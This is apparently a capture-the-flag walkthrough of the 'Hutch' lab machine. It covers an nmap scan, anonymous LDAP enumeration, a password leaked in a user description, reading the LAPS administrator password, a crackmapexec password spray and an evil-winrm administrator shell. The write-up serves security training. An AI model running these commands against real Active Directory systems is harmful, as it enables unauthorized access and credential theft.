# Hutch
### Enumeration
```
# Nmap 7.92 scan initiated Sat May  7 15:17:03 2022 as: nmap -sCV -v -p- -oN nmap/tcp_all.out 192.168.202.122
Nmap scan report for ip-192-168-202-122.eu-west-1.compute.internal (192.168.202.122)
Host is up (0.014s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-webdav-scan:
|   Server Type: Microsoft-IIS/10.0
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Server Date: Sat, 07 May 2022 15:20:04 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-07 15:19:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49930/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-05-07T15:20:07
|_  start_date: N/A
|_clock-skew: -1s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May  7 15:20:46 2022 -- 1 IP address (1 host up) scanned in 222.54 seconds
```

We can see the domain name is `hutch.offsec`.

##### 80
Default webserver, a shallow run of gobuster found nothing interesting.

##### SMB
No anonymous access.

##### LDAP
We have anonymous access to LDAP:

```
ldapsearch -x -H ldap://192.168.202.122 -b "dc=hutch,dc=offsec"
```

We'll create a userlist first:

```
ldapsearch -x -H ldap://192.168.202.122 -b "dc=hutch,dc=offsec" '(objectclass=user)' samaccountname | grep -i samaccountname | cut -d: -f2 > ../users.txt
```

Looking at the results of the original full query, we see one user, `fmcsorley` leaks a password in the description, which says:

```
Password set to CrabSharkJellyfish192 at user's request. Please change on next login.
```

Trying the credentials `fmcsorley:CrabSharkJellyfish192` on SMB, we have access to some shares (`NETLOGON`, `SYSVOL` and `IPC$`). However, there's nothing interesting in any of them.

Using them with LDAP returns more information than we had anonymous access to:

```
ldapsearch -x -H ldap://192.168.229.122 -b "dc=hutch,dc=offsec" -w CrabSharkJellyfish192 -D "CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec"
```

I noticed the following entry in the (very large) output:

```
ms-Mcs-AdmPwd: cKco(1-%}!W5IK
```

Googling around, I found out that this is the local administrator password. Note that this might change frequently, so it's possible that you will need to query it again if it fails to grant access.

In addition to finding this password, we found a few more user accounts, so I made a new userlist. I ran a password spray with `crackmapexec`:

```
crackmapexec ldap hutch.offsec --kdcHost hutch.offsec -u users_fmcsorley.txt -p 'cKco(1-%}!W5IK' --continue-on-success
SMB         hutch.offsec    445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
LDAP        hutch.offsec    389    HUTCHDC          [+] hutch.offsec\Administrator:cKco(1-%}!W5IK (Pwn3d!)
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\Guest:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\HUTCHDC$:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\krbtgt:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\rplacidi:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\opatry:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\ltaunton:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\acostello:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\jsparwell:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\oknee:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\jmckendry:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\avictoria:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\jfrarey:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\eaburrow:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\cluddy:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\agitthouse:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\fmcsorley:cKco(1-%}!W5IK
LDAP        hutch.offsec    389    HUTCHDC          [-] hutch.offsec\domainadmin:cKco(1-%}!W5IK
```

Now we can use `evil-winrm` to get a shell as administrator:

```
evil-winrm -u administrator -p 'cKco(1-%}!W5IK' -i 192.168.229.122
```